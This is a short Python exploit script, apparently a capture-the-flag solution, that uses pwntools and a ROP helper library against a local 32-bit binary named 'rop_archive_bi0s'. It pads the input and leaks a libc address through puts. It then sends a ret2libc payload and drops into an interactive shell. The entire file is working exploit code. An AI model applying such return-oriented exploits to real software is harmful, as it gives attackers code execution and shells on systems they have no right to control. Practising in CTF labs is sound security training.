import james2rop
import pwn

p = james2rop.Elf32Process (binary = './rop_archive_bi0s')
p.set_exit_address (0x080491df)
p.set_size (18)

payload = p.padding () + p.leak_libc_payload ('puts', '__libc_start_main', log = True)
pwn.log.info ('leak payload: %s' % payload)
p.send_payload (payload, b' ..\n')
leak = p.recv_libc_leak ()
pwn.log.info ('leaaaked: %s' % hex (leak))

payload = p.padding () + p.ret2libc_payload (log = True)
p.send_payload (payload, b' ..\n')

# shell
p.proc.interactive ()
